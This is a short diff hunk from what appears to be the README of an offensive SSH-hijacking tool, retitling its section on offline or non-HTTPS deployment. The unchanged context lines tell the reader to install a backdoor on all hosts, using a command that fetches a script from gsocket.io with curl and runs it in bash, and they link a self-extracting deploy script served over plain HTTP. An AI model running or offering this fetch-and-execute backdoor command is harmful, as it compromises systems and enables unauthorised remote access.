@@ -75,7 +75,8 @@ Install a [backdoor](https://www.gsocket.io/deploy) on _all_ hosts:
 ~/.config/prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
 ```
 
-#### When HTTPS is not available
+#### Offline Installs or when HTTPS is not available
+
 Deploy from a self-extracting shell-script [ssh-it-deploy.sh](http://nossl.segfault.net/ssh-it-deploy.sh):
 ```shell
 # Without HTTPS 
